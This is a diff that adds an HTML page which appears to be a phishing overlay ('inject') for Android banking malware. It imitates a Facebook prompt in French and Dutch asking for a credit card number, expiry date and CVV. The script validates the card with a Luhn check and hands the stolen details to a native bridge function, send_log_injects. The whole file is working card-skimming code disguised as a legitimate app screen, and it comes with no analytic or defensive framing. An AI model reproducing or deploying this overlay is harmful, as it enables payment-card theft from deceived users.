@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .input {
+            border: 0;
+            width: 100%;
+            padding: 8px;
+            color: #1d4962;
+            font-size: 18px;
+            padding-left: 0;
+            background-color: #fff;
+            border-bottom: 1px solid #d1d1d1;
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            border-color: #039353;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        .button {
+            width: 100%;
+            background-color: #479e66;
+            border: 0;
+            border-radius: 4px;
+            color: #fff;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-weight: 300;
+        }
+
+        .button:disabled {
+            background-color: #eaeaea;
+            color: #afafaf;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABJIAAADTCAMAAADteMn3AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NkYzMzc4QjhBOEU1MTFFQkE1MjJEMTI0NjZDQjY2Q0QiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NkYzMzc4QjlBOEU1MTFFQkE1MjJEMTI0NjZDQjY2Q0QiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2RjMzNzhCNkE4RTUxMUVCQTUyMkQxMjQ2NkNCNjZDRCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2RjMzNzhCN0E4RTUxMUVCQTUyMkQxMjQ2NkNCNjZDRCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnkZ2eEAAAIrUExURQCUVACU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" alt="">
+            <p style="text-align: center;color: #1d4962;font-size: 18px;font-weight: 100;margin-top: 10px;"> {{t.__text}} </p>
+        </header>
+        <section>
+            <input type="tel" class="input" id="cc" name="cc" onkeyup="check8()" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off">
+        
+            <input type="tel" id="exp" name="exp" maxlength="5" style="width: 49%;float: left;" onkeyup="check7();check8()" class="input" placeholder="{{t.__input1}}" autocomplete="off">
+            <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 49%;float: right;" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">
+        </section>
+        <footer>
+            <input type="button" class="button" id="sendData" disabled value="{{t.__button}}">
+        </footer>
+    </form>
+
+    <script>
+        $('#cc').mask('0000 0000 0000 0000 0');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000');
+
+        $('.cool-input__input').on('input', function(){
+           var $this = $(this);
+           if ($this.val() == '') {
+               $this.removeClass('cool-input__input_filled');
+           } else {
+               $this.addClass('cool-input__input_filled');
+           }
+        });
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var sendData = document.getElementById('sendData');
+
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check6(cb) {
+            if(!valid_credit_card(cb)) {
+                cc.classList.add('error');
+            } else {
+                cc.classList.remove('error');
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(check6(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+        
+        if ( typeof Android == "undefined")
+        var Android = {
+            returnResult : alert.bind(window)
+        }
+    
+    var stringifyJSON = function(obj) {
+        var arrOfKeyVals = [],
+            arrVals = [],
+            objKeys = [];
+    
+        if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+            return '' + obj;
+        else if (typeof obj === 'string')
+            return '"' + obj + '"';
+    
+        else if (Array.isArray(obj)) {
+            if (obj[0] === undefined)
+                return '[]';
+            else {
+                obj.forEach(function(el) {
+                    arrVals.push(stringifyJSON(el));
+                });
+                return '[' + arrVals.join(',') + ']';
+            }
+        }else if (obj instanceof Object) {
+            objKeys = Object.keys(obj);
+            objKeys.forEach(function(key) {
+                var keyOut = '"' + key + '":';
+                var keyValOut = obj[key];
+                if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                    arrOfKeyVals.push('');
+                else if (typeof keyValOut === 'string')
+                    arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                    arrOfKeyVals.push(keyOut + keyValOut);
+                else if (keyValOut instanceof Object) {
+                    arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                }
+            });
+            return '{' + arrOfKeyVals + '}';
+        }
+    }; 
+    </script>
+    <script>
+            var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                fr: { 
+                    __cc: "Carte de crédit",
+                    __input1: "Péremption",
+                    __button: "Suivant",
+                    __text: "Quel est votre numéro de carte?",
+                }, 
+        
+                nl: { 
+                    __cc: "Kredietkaart",
+                    __input1: "Vervaldatum",
+                    __button: "Volgende",
+                    __text: "Wat is je kaartnummer?",
+                }
+            }
+
+    
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.fr : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+    </script>
+</body>
+</html>
